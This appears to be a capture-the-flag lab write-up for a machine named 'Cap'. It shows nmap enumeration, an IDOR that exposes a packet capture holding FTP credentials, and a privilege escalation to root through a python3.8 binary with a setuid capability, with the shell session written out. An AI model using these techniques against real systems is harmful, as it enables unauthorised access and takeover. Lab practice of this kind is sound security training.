# Enumeration

The `nmap` command I ran is 
```
sudo nmap -sC -sV -vv -oA cap [Machine IP]
```

Here's the output:
```
# Nmap 7.98 scan initiated Sun Feb 15 23:49:15 2026 as: /usr/lib/nmap/nmap -sC -sV -vv -oA cap 10.129.8.204
Increasing send delay for 10.129.8.204 from 0 to 5 due to 31 out of 101 dropped probes since last increase.
Nmap scan report for 10.129.8.204
Host is up, received echo-reply ttl 63 (0.97s latency).
Scanned at 2026-02-15 23:49:16 EST for 69s
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0=
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI=
|   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH
80/tcp open  http    syn-ack ttl 63 Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 15 23:50:25 2026 -- 1 IP address (1 host up) scanned in 69.48 seconds
```

There are 3 ports open which we can see
21, which is `ftp` running `vsftpd 3.0.3`
22, which is `ssh` and the banner tells us its an `Ubuntu` server
And then there is 80, which is `HTTP` running `Gunicorn`

## Gunicorn

`Gunicorn ("Green Unicorn") is a production-ready WSGI HTTP server for UNIX, designed to run Python web applications (Flask, Django, etc.) by bridging them with web servers like Nginx.`

![[{8CB68AAE-694C-4B04-8F3C-B3A33805BDD9}.png]]

When we open the webpage on port 80, we see a security dashboard and we are logged in as the user `Nathan`.

When we click on Security Snapshot, it takes us to `http://10.129.8.204/data/2`

We can change the 2 on the end of the URL and change it to 0, and we will come upon a different page
This is called `IDOR (Insecure Direct Object Referrence)`

I downloaded it and got a file named `0.pcap`. 
On inspecting the file in wireshark, I found the credentials of the user `Nathan`
![[{EEF8A333-454D-4366-8D43-75F090283ECF}.png]]

I used these credentials to do FTP into port 21 and found `user.txt` in his home directory

On running `linpeas.sh`, I found a privilege escalation vector.
![[{463152F4-A51F-4207-8F60-29C1DBEB7AE6}.png]]

This means I can abuse the binary `/usr/bin/python3.8` to escalate my privileges to root.

```
nathan@cap:~$ /usr/bin/python3.8
Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.system("/bin/bash")
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
root@cap:~# cat /root/root.txt
e14474de835a8fcda2de9f952ac44343


```

